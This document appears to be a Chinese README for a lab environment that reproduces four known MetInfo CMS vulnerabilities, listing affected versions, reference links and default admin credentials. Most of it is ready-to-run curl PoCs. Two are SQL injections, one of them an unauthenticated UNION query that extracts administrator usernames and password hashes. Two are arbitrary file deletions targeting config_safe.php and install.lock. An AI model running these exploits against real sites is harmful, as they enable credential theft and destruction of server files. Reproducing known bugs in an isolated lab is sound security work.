## 环境说明

* src/metinfo/5.3.17
  * 后台地址http://127.0.0.1/admin/
  * 管理员账号admin/admin
* src/metinfo/5.3.5
  - 后台地址http://127.0.0.1/admin/
  - 管理员账号admin/admin

## X-Rewrite-URL SQL注入

测试镜像

* src/metinfo/5.3.17/

要求

* 管理员在 `营销 -> SEO` 下面，开启伪静态
* 管理员安装了至少两种语言包，只安装中文会导致 `$lang` 被覆盖，无法注入

影响版本

* metinfo<= 5.3.17

参考链接

* [Metinfo 5.3.17 前台SQL注入漏洞分析](https://paper.seebug.org/371/)

Poc

```
curl -I 'http://127.0.0.1/index.php?lang=Cn&index=xxxx' -H "X-Rewrite-URL: 'and 1=2 union select version(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/index.php"
```

关键代码

```
# config/config.inc.php
$met_index_type = $db->get_one("SELECT * FROM $met_config WHERE name='met_index_type' and lang='metinfo'");

..

if(count($met_langok)==1)$lang=$met_index_type;

# include/global.func.php
$dir_dirname=$dirs[count($dirs)-2];

...

if($lang==$met_index_type){
	
	...

} else {

	...

$query="select * from $met_column where foldername='$dir_dirname' and lang='$lang' and (classtype='1' or releclass!='0') order by id asc";

	...
```



## Metinfo前台SQL注入漏洞

测试镜像

- src/metinfo/5.3.17/

影响版本

- metinfo<= 5.3

参考链接

- [Metinfo 最新版 前台无需登录注入一枚](http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2016-0193924)

Poc

```
curl "172.17.0.2/member/login.php/aa'UNION%20SELECT%20(select%20concat('sql-data:',admin_id,'@',admin_pass)%20from%20met_admin_table%20limit%201),11113,11111,11111,11111,11111,11111,11111,11111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111,1111111111%23/aa" |grep 'sql-data'
```



## Metinfo前台任意文件删除漏洞

测试镜像

- src/metinfo/5.3.5/

影响版本

- metinfo<= 5.3.5

参考链接

- [Metinfo 最新版前台注入一枚](http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2016-0193729)

Poc

参数formname[tmp_name]为要删除的文件，被删除的文件会被移动到formname[name]参数指定的路径

```shell
curl "http://172.17.0.2/app/system/entrance.php?c=uploadify&a=doupfile&savepath=../&formname\[\]=file&formname\[name\]=yu.jpg&formname\[tmp_name\]=../../config/config_safe.php&is_rename=0"
```

成功会返回

```json
{"error":"0","path":"..\/upload\/..\/yu(1).jpg"}
```



## Metinfo后台任意文件删除漏洞

测试镜像

- src/metinfo/5.3.17/

影响版本

- metinfo < 6.0

参考链接

- [某CMS 5.X版本GETSHELL漏洞合集](https://xz.aliyun.com/t/2096#toc-2)

Poc

使用管理员账号登录后台，访问链接：

```
http://172.17.0.2/admin/app/batch/csvup.php?fileField=1_1231-1&flienamecsv=../../../config/install.lock
```

参数flienamecsv为删除的目标文件



